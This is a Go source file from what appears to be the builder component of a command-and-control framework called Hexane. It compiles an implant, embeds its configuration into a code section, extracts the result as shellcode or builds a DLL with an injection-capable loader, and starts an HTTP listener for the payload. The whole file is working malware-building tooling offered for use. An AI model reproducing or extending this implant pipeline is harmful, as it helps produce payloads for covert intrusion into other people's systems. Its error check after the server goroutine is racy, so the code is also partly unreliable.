package core

import (
	"fmt"
	"os"
	"path"
	"path/filepath"
	"time"
)

const (
	BUILD_TYPE_SHELLCODE = 0
	BUILD_TYPE_DLL       = 1
)

var (
	BuildPath   = path.Join(RootDirectory, "build")
	ConfigsPath = path.Join(RootDirectory, "configs")
	CorePath    = path.Join(RootDirectory, "core")
	LogsPath    = path.Join(RootDirectory, "logs")
	LoaderPath  = path.Join(RootDirectory, "loader")
	ImplantPath = path.Join(RootDirectory, "implant")
	HashHeader  = path.Join(CorePath, "include/names.hpp")
	HashStrings = path.Join(ConfigsPath, "strings.txt")
)

func (h *HexaneConfig) GetModuleConfig(config *JsonConfig) *Module {

	module := &Module{
		RootDirectory: config.Builder.RootDirectory,
		OutputName:    config.Builder.OutputName,
		LinkerScript:  config.Builder.LinkerScript,

		Files: &Sources{
			Sources:            config.Builder.Sources,
			Dependencies:       config.Builder.Dependencies,
			IncludeDirectories: []string{RootDirectory, config.Builder.RootDirectory},
		},

		Loader: &Loader{
			RootDirectory: config.Builder.Loader.RootDirectory,
			LinkerScript:  config.Builder.Loader.LinkerScript,
			RsrcScript:    config.Builder.Loader.RsrcScript,
			RsrcBinary:    config.Builder.Loader.RsrcBinary,
			Sources:       config.Builder.Loader.Sources,
			Injection:     config.Builder.Loader.Injection,
		},
	}

	if config.Builder.Loader == nil {
		module.BuildType = BUILD_TYPE_SHELLCODE
	} else {
		module.BuildType = BUILD_TYPE_DLL
	}

	return module
}

func (h *HexaneConfig) BuildModule() error {
	var (
		err    error
		module *Module
	)

	if module = h.GetModuleConfig(h.UserConfig); module == nil {
		return fmt.Errorf("module config is nil")
	}
	module.OutputName = filepath.Join(BuildPath, module.OutputName)

	if module.LinkerScript != "" {
		module.LinkerScript = filepath.Join(module.RootDirectory, module.LinkerScript)
	}

	if module.Loader.LinkerScript != "" {
		module.Loader.LinkerScript = filepath.Join(module.Loader.RootDirectory, module.Loader.LinkerScript)
	}

	if err = h.BuildSources(module); err != nil {
		return err
	}

	if len(module.Components) > 1 {
		return h.ExecuteBuildType(module)
	} else {
		module.OutputName = module.Components[0]
		return nil
	}
}

func (h *HexaneConfig) RunBuild() error {
	var err error

	WrapMessage("DBG", "creating payload directory")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("DBG", "generating config")
	if err = h.GenerateConfigBytes(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHeader); err != nil {
		return err
	}

	WrapMessage("DBG", "generating implant\n")
	if err = h.BuildModule(); err != nil {
		return err
	}

	WrapMessage("DBG", "embedding implant config data")
	if err = h.EmbedSectionData(BuildPath+"/implant.exe", ".text$F", h.ConfigBytes); err != nil {
		return err
	}

	WrapMessage("DBG", "extracting shellcode")
	if err = h.CopySectionData(BuildPath+"/implant.exe", path.Join(h.Compiler.BuildDirectory, "shellcode.bin"), ".text"); err != nil {
		return err
	}

	go func() {
		err = h.HttpServerHandler()
	}()

	time.Sleep(500 * time.Millisecond)
	if err != nil {
		return err
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.UserConfig.Builder.OutputName))

	return nil
}
